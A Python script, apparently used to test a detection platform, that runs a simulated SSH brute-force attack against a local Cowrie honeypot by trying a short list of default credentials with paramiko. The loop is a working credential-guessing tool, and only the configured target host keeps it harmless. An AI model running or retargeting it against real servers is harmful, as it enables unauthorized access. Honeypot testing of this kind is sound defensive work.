#!/usr/bin/env python3
"""
Simulated brute force attack on Cowrie honeypot
Attacker IP: 197.211.32.242
"""

import paramiko
import time

COWRIE_HOST = "localhost"
COWRIE_PORT = 2222
ATTACKER_IP = "197.211.32.242"

CREDENTIALS = [
    ("root", "123456"),
    ("root", "password"),
    ("admin", "admin"),
    ("admin", "123456"),
    ("ubuntu", "ubuntu"),
    ("user", "user"),
    ("root", "toor"),
    ("root", "root"),      # <- succès
]

def try_login(username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            COWRIE_HOST, port=COWRIE_PORT,
            username=username, password=password,
            timeout=5, look_for_keys=False, allow_agent=False,
        )
        return True, client
    except paramiko.AuthenticationException:
        return False, None
    except Exception as e:
        print(f"  [ERR] {e}")
        return False, None

def run():
    print(f"[*] Simulated attacker : {ATTACKER_IP}")
    print(f"[*] Target             : {COWRIE_HOST}:{COWRIE_PORT}")
    print(f"[*] Wordlist size      : {len(CREDENTIALS)} credentials\n")

    for username, password in CREDENTIALS:
        success, client = try_login(username, password)
        if success:
            print(f"[+] SUCCESS  {username}:{password}")
            time.sleep(1)
            client.close()
        else:
            print(f"[-] FAILED   {username}:{password}")
        time.sleep(0.5)

    print("\n[*] Done. Inject into Elasticsearch to test the platform.")

if __name__ == "__main__":
    run()
